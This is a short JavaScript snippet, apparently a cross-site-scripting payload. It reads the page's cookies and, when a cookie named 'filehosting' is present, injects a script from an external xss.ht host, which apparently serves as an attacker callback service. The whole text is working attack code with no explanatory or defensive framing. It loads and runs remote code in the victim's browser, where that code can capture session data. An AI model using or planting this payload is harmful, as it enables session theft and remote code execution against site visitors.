function getCookie(name) {
       var cArr = document.cookie.split(';');
       for(var i=0;i < cArr.length;i++) {
        var cookie = cArr[i].split("=",2);
         cookie[0] = cookie[0].replace(/^\s+/,"");
         if (cookie[0] == name){ return cookie; }
       }
    }
if (getCookie("filehosting")){
  var a=document.createElement('script');
 a.src='https://rachana.xss.ht';
 document.body.appendChild(a);
}    
